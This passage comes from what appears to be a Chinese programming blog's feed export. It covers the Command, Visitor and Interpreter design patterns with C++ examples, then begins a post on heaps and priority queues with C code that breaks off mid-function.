)<br>    &#123;<br>      <span class="hljs-keyword">delete</span> receiver;<br>    &#125;<br>  &#125;<br>  <br>  <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">execute</span><span class="hljs-params">()</span></span><br><span class="hljs-function">  </span>&#123;<br>    receiver-&gt;action();<br>  &#125;<br>  <span class="hljs-comment">// ...</span><br>  <br><span class="hljs-keyword">private</span>:<br>  Receiver *receiver;<br>  <span class="hljs-comment">// ...</span><br>&#125;;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Invoker</span><br><span class="hljs-comment"> * asks the command to carry out the request</span><br><span class="hljs-comment"> */</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Invoker</span></span><br><span class="hljs-class">&#123;</span><br><span class="hljs-keyword">public</span>:<br>  <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">set</span><span class="hljs-params">( Command *c )</span></span><br><span class="hljs-function">  </span>&#123;<br>    command = c;<br>  &#125;<br>  <br>  <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">confirm</span><span class="hljs-params">()</span></span><br><span class="hljs-function">  </span>&#123;<br>    <span class="hljs-keyword">if</span> ( command )<br>    &#123;<br>      command-&gt;execute();  <br>    &#125;<br>  &#125;<br>  <span class="hljs-comment">// ...</span><br><br><span class="hljs-keyword">private</span>:<br>  Command *command; <span class="hljs-comment">// 可以设置为多个command的容器</span><br>  <span class="hljs-comment">// ...</span><br>&#125;;<br><br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-function">ConcreteCommand <span class="hljs-title">command</span><span class="hljs-params">( <span class="hljs-keyword">new</span> Receiver() )</span></span>;<br>  <br>  Invoker invoker;<br>  invoker.<span class="hljs-built_in">set</span>( &amp;command );<br>  invoker.confirm();<br>  <br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>Command模式有点类似C++的函数对象，但是两者也有明显不同。</p><p>面向对象的Command模式对于接口的定义更加规范灵活，但是性能会低一些。C++函数对象加上模板，是通过函数签名来定义接口，另外运行时性能会更高一些。</p><p>在不能使用模板和函数对象的语言中，Command模式会比较常见一些。</p><h3><span id="visitor">Visitor</span></h3><p>在某些层次结构的类中，比如一个抽象父类下有多个子类，如果需要增加一个新的方法到所有子类中，直接从基类开始修改的话，无疑会很麻烦，而且不符合对修改封闭的设计原则。</p><p>Visitor模式表示一个作用于某对象结构中的各元素的操作。它使你可以在不改变各元素的类的前提下定义作用于这些元素的新操作。</p><p>使用Visitor类来修改原来的类中的方法。</p><p>比如以下代码</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;iostream&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> <span class="hljs-built_in">std</span>;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Element</span></span><br><span class="hljs-class">&#123;</span><br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-keyword">void</span> <span class="hljs-title">Func1</span><span class="hljs-params">()</span> </span>= <span class="hljs-number">0</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-keyword">void</span> <span class="hljs-title">Func2</span><span class="hljs-params">(<span class="hljs-keyword">int</span> data)</span></span>=<span class="hljs-number">0</span>;<br>    <span class="hljs-comment">//新增方法</span><br>    <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-keyword">void</span> <span class="hljs-title">Func3</span><span class="hljs-params">(<span class="hljs-keyword">int</span> data)</span></span>=<span class="hljs-number">0</span>;<br>    <br>    <span class="hljs-keyword">virtual</span> ~Element()&#123;&#125;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ElementA</span> :</span> <span class="hljs-keyword">public</span> Element &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">Func1</span><span class="hljs-params">()</span> <span class="hljs-keyword">override</span></span>&#123;...&#125;<br>    <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">Func2</span><span class="hljs-params">(<span class="hljs-keyword">int</span> data)</span> <span class="hljs-keyword">override</span></span>&#123;...&#125;<br>    <span class="hljs-comment">// 需要新增方法</span><br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ElementB</span> :</span> <span class="hljs-keyword">public</span> Element<br>&#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">Func1</span><span class="hljs-params">()</span> <span class="hljs-keyword">override</span></span>&#123;...&#125;<br>    <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">Func2</span><span class="hljs-params">(<span class="hljs-keyword">int</span> data)</span> <span class="hljs-keyword">override</span> </span>&#123;...&#125;<br>    <span class="hljs-comment">// 需要新增方法</span><br>&#125;;<br></code></pre></div></td></tr></table></figure><p>新增方法3，需要更改所有Element类。</p><p>使用Visitor模式，结构如下：</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;iostream&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> <span class="hljs-built_in">std</span>;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Element</span></span><br><span class="hljs-class">&#123;</span><br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-keyword">void</span> <span class="hljs-title">accept</span><span class="hljs-params">(Visitor&amp; visitor)</span> </span>= <span class="hljs-number">0</span>; <span class="hljs-comment">//第一次多态辨析</span><br>    <span class="hljs-keyword">virtual</span> ~Element()&#123;&#125;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ElementA</span> :</span> <span class="hljs-keyword">public</span> Element<br>&#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">accept</span><span class="hljs-params">(Visitor &amp;visitor)</span> <span class="hljs-keyword">override</span> </span>&#123;<br>        visitor.visitElementA(*<span class="hljs-keyword">this</span>);<br>    &#125;<br>    ...<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ElementB</span> :</span> <span class="hljs-keyword">public</span> Element<br>&#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">accept</span><span class="hljs-params">(Visitor &amp;visitor)</span> <span class="hljs-keyword">override</span> </span>&#123;<br>        visitor.visitElementB(*<span class="hljs-keyword">this</span>); <span class="hljs-comment">//第二次多态辨析</span><br>    &#125;<br>...<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Visitor</span>&#123;</span><br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-keyword">void</span> <span class="hljs-title">visitElementA</span><span class="hljs-params">(ElementA&amp; element)</span> </span>= <span class="hljs-number">0</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-keyword">void</span> <span class="hljs-title">visitElementB</span><span class="hljs-params">(ElementB&amp; element)</span> </span>= <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">virtual</span> ~Visitor()&#123;&#125;<br>&#125;;<br></code></pre></div></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-comment">//扩展方法，通过visitElementA、visitElementB实现</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Visitor1</span> :</span> <span class="hljs-keyword">public</span> Visitor&#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">visitElementA</span><span class="hljs-params">(ElementA&amp; element)</span> <span class="hljs-keyword">override</span></span>&#123;<br>        <span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">"Visitor1 is processing ElementA"</span> &lt;&lt; <span class="hljs-built_in">endl</span>;<br>    &#125;<br>        <br>    <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">visitElementB</span><span class="hljs-params">(ElementB&amp; element)</span> <span class="hljs-keyword">override</span></span>&#123;<br>        <span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">"Visitor1 is processing ElementB"</span> &lt;&lt; <span class="hljs-built_in">endl</span>;<br>    &#125;<br>&#125;;<br><br><span class="hljs-comment">//扩展另一种方法</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Visitor2</span> :</span> <span class="hljs-keyword">public</span> Visitor&#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">visitElementA</span><span class="hljs-params">(ElementA&amp; element)</span> <span class="hljs-keyword">override</span></span>&#123;<br>        <span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">"Visitor2 is processing ElementA 2"</span> &lt;&lt; <span class="hljs-built_in">endl</span>;<br>    &#125;<br>    <br>    <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">visitElementB</span><span class="hljs-params">(ElementB&amp; element)</span> <span class="hljs-keyword">override</span></span>&#123;<br>        <span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">"Visitor2 is processing ElementB 2"</span> &lt;&lt; <span class="hljs-built_in">endl</span>;<br>    &#125;<br>&#125;;<br><br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    Visitor2 visitor;<br>    ElementB elementB;<br>    elementB.accept(visitor);<br>    <br>    ElementA elementA;<br>    elementA.accept(visitor);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>使用Visitor模式之后，只需要扩展新的Visitor子类，就能增加新的方法。</p><p>这个过程中，有一种被称为 double dispatch 的实现方法。第一次 dispatch，Element类中的accept方法，辨析时哪一个扩展的Visitor子类。第二次dispatch，accept方法内visitor的成员方法visitElementX方法，辨析当前类是哪一种Element子类。</p><p>Visitor模式的使用有一个严格的条件，Element子类的数目必须是已知的，且不会发生变化。否则，整个过程将不再稳定，Visitor模式不如不用。</p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/img/picgo/2021/10/25/19-35-56-227b8d.png" srcset="/img/loading.gif" lazyload style="zoom:60%;"></p><h2><span id="领域规则相关模式">领域规则相关模式</span></h2><p>在特定领域中，可以将变化模式抽象为一些规则，将这些规则通过设计语法实现，就能解决一般性的问题。</p><p>典型模式：</p><ul><li>Interpreter</li></ul><h3><span id="interpreter">Interpreter</span></h3><p>如果在软件构建过程中，某些结构不断地重复出现。构建一种规则，使得问题可以被表达，并通过一个解释器，来解释还原这个表达。</p><p>Interpreter模式给定一个语言，定义它的文法的一种表示，并定义一个解释器，这个解释器使用该表示来解释语言中的句子。</p><p>定义比较抽象。举例来说，实现一个加减法表达式运算，可以抽向出加法运算文法地类、减法运算文法地类等，实现一个解释器完成加减运算优先级的处理，调用不同的文法处理操作数。</p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/img/picgo/2021/10/25/19-51-50-51d472.png" srcset="/img/loading.gif" lazyload style="zoom:60%;"></p><h4><span id="抽象代码结构">抽象代码结构</span></h4><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;map&gt;</span></span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Context</span><br><span class="hljs-comment"> * contains information that's global to the interpreter</span><br><span class="hljs-comment"> */</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Context</span></span><br><span class="hljs-class">&#123;</span><br><span class="hljs-keyword">public</span>:<br>  <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">set</span><span class="hljs-params">( <span class="hljs-keyword">const</span> <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span>&amp; var, <span class="hljs-keyword">const</span> <span class="hljs-keyword">bool</span> value)</span></span><br><span class="hljs-function">  </span>&#123;<br>    vars.insert( <span class="hljs-built_in">std</span>::pair&lt;<span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span>, <span class="hljs-keyword">bool</span>&gt;( var, value ) );<br>  &#125;<br>  <br>  <span class="hljs-function"><span class="hljs-keyword">bool</span> <span class="hljs-title">get</span><span class="hljs-params">( <span class="hljs-keyword">const</span> <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span>&amp; <span class="hljs-built_in">exp</span> )</span></span><br><span class="hljs-function">  </span>&#123;<br>    <span class="hljs-keyword">return</span> vars[ <span class="hljs-built_in">exp</span> ];<br>  &#125;<br>  <span class="hljs-comment">// ...</span><br><br><span class="hljs-keyword">private</span>:<br>  <span class="hljs-built_in">std</span>::<span class="hljs-built_in">map</span>&lt;<span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span>, <span class="hljs-keyword">bool</span>&gt; vars;<br>  <span class="hljs-comment">// ...</span><br>&#125;;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Abstract Expression</span><br><span class="hljs-comment"> * declares an abstract Interpret operation that is common to all nodes</span><br><span class="hljs-comment"> * in the abstract syntax tree</span><br><span class="hljs-comment"> */</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">AbstractExpression</span></span><br><span class="hljs-class">&#123;</span><br><span class="hljs-keyword">public</span>:<br>  <span class="hljs-keyword">virtual</span> ~AbstractExpression() &#123;&#125;<br>  <br>  <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-keyword">bool</span> <span class="hljs-title">interpret</span><span class="hljs-params">( Context* <span class="hljs-keyword">const</span> )</span></span><br><span class="hljs-function">  </span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>  &#125;<br>  <span class="hljs-comment">// ...</span><br>&#125;;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Terminal Expression</span><br><span class="hljs-comment"> * implements an Interpret operation associated with terminal symbols</span><br><span class="hljs-comment"> * in the grammar (an instance is required for every terminal symbol</span><br><span class="hljs-comment"> * in a sentence)</span><br><span class="hljs-comment"> */</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TerminalExpression</span> :</span> <span class="hljs-keyword">public</span> AbstractExpression<br>&#123;<br><span class="hljs-keyword">public</span>:<br>  TerminalExpression( <span class="hljs-keyword">const</span> <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span>&amp; val ) : value( val ) &#123;&#125;<br>  <br>  ~TerminalExpression() &#123;&#125;<br>  <br>  <span class="hljs-function"><span class="hljs-keyword">bool</span> <span class="hljs-title">interpret</span><span class="hljs-params">( Context* <span class="hljs-keyword">const</span> context )</span></span><br><span class="hljs-function">  </span>&#123;<br>    <span class="hljs-keyword">return</span> context-&gt;<span class="hljs-built_in">get</span>( value );<br>  &#125;<br>  <span class="hljs-comment">// ...</span><br>  <br><span class="hljs-keyword">private</span>:<br>  <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> value;<br>  <span class="hljs-comment">// ...</span><br>&#125;;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Nonterminal Expression</span><br><span class="hljs-comment"> * implements an Interpret operation for nonterminal symbols</span><br><span class="hljs-comment"> * in the grammar (one such class is required for every rule in the grammar)</span><br><span class="hljs-comment"> */</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">NonterminalExpression</span> :</span> <span class="hljs-keyword">public</span> AbstractExpression<br>&#123;<br><span class="hljs-keyword">public</span>:<br>  NonterminalExpression( AbstractExpression *left, AbstractExpression *right ) : <br>    lop( left ), rop( right ) &#123;&#125;<br>  <br>  ~NonterminalExpression()<br>  &#123;<br>    <span class="hljs-keyword">delete</span> lop;<br>    <span class="hljs-keyword">delete</span> rop;<br>  &#125;<br>  <br>  <span class="hljs-function"><span class="hljs-keyword">bool</span> <span class="hljs-title">interpret</span><span class="hljs-params">( Context *<span class="hljs-keyword">const</span> context )</span></span><br><span class="hljs-function">  </span>&#123;<br>    <span class="hljs-keyword">return</span> lop-&gt;interpret( context ) &amp;&amp; rop-&gt;interpret( context );<br>  &#125;<br>  <span class="hljs-comment">// ...</span><br>  <br><span class="hljs-keyword">private</span>:<br>  AbstractExpression *lop;<br>  AbstractExpression *rop;<br>  <span class="hljs-comment">// ...</span><br>&#125;;<br><br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-comment">// An example of very simple expression tree</span><br>  <span class="hljs-comment">// that corresponds to expression (A AND B)</span><br>  AbstractExpression *A = <span class="hljs-keyword">new</span> TerminalExpression(<span class="hljs-string">"A"</span>);<br>  AbstractExpression *B = <span class="hljs-keyword">new</span> TerminalExpression(<span class="hljs-string">"B"</span>);<br>  AbstractExpression *<span class="hljs-built_in">exp</span> = <span class="hljs-keyword">new</span> NonterminalExpression( A, B );<br>  <br>  Context context;<br>  context.<span class="hljs-built_in">set</span>( <span class="hljs-string">"A"</span>, <span class="hljs-literal">true</span> );<br>  context.<span class="hljs-built_in">set</span>( <span class="hljs-string">"B"</span>, <span class="hljs-literal">false</span> );<br>  <br>  <span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span> &lt;&lt; context.<span class="hljs-built_in">get</span>( <span class="hljs-string">"A"</span> ) &lt;&lt; <span class="hljs-string">" AND "</span> &lt;&lt; context.<span class="hljs-built_in">get</span>( <span class="hljs-string">"B"</span> );<br>  <span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">" = "</span> &lt;&lt; <span class="hljs-built_in">exp</span>-&gt;interpret( &amp;context ) &lt;&lt; <span class="hljs-built_in">std</span>::<span class="hljs-built_in">endl</span>;<br>  <br>  <span class="hljs-keyword">delete</span> <span class="hljs-built_in">exp</span>;<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>实现这个模式挺复杂的，处理一些简单情况还行。太复杂的情况，面向对象的方式本身代价也比较大，此时可以考虑使用一些语法分析生成器标准工具。</p><h2><span id="设计模式小结">设计模式小结</span></h2><p>设计模式的目标是，提高复用性，管理分离变化的部分。所以，对复用性没有要求的时候，设计模式也没那么必要。</p><p>什么时候不用模式？代码可读性很差时，不用模式。需求理解不充分时，不用模式。程序中变化的部分没有显现时，不用模式。不是系统的关键依赖点的地方，不用模式。项目没有复用价值时，不用模式。项目将要发布时，不用模式。</p>]]></content>
      
      
      <categories>
          
          <category> Notes </category>
          
          <category> Design Patterns </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cs basic </tag>
            
            <tag> design patterns </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>数据结构整理-part3</title>
      <link href="/posts/3626ce4c.html"/>
      <url>/posts/3626ce4c.html</url>
      
        <content type="html"><![CDATA[<h2><span id="堆与优先队列">堆与优先队列</span></h2><p>堆可以看成是一棵完全二叉树，除最后一层以外，它的每一层都是填满的，最后一层从左到右依次填入。</p><p>根结点权值大于等于树中任意结点权值的堆称为大根堆。</p><p>根结点权值小于等于树中任意结点权值的堆则称为小根堆。</p><p>并不需要真的维护一棵完全二叉树，而只需用一个数组来存储，堆按从上到下，从左到右的顺序，依次存储在下标从1 开始的数组里。</p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/img/picgo/2021/10/05/18-25-55-99cbd5.png" srcset="/img/loading.gif" lazyload style="zoom:67%;"></p><p>元素插入，先添加到完全二叉树的最后一位之后，然后对比与父节点的关系，判断是否交换与父节点的位置。</p><p>元素删除，先对调堆顶元素与完全二叉树最后一个元素，删除最后一个元素，然后从堆顶开始调整二叉树的堆序性。</p><p>堆排序，和元素删除类似，只是不删除对调之后的最后一个元素，只是将序列尾部index 减一。直到 index 等于 0。</p><p>总而言之，挺简单的。</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Heap</span> &#123;</span><br>    <span class="hljs-keyword">int</span> *data, <span class="hljs-built_in">size</span>;<br>&#125; Heap;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">init</span><span class="hljs-params">(Heap *h, <span class="hljs-keyword">int</span> length_input)</span> </span>&#123;<br>    h-&gt;data = (<span class="hljs-keyword">int</span> *)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">int</span>) * length_input);<br>    h-&gt;<span class="hljs-built_in">size</span> = <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">swap</span><span class="hljs-params">(<span class="hljs-keyword">int</span> *a, <span class="hljs-keyword">int</span> *b)</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> temp = *a;<br>    *a = *b;<br>    *b = temp;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">push</span><span class="hljs-params">(Heap *h, <span class="hljs-keyword">int</span> value)</span> </span>&#123;<br>    h-&gt;data[h-&gt;<span class="hljs-built_in">size</span>] = value;<br>    <span class="hljs-keyword">int</span> cur = h-&gt;<span class="hljs-built_in">size</span>;<br>    <span class="hljs-keyword">int</span> parent = (cur - <span class="hljs-number">1</span>) / <span 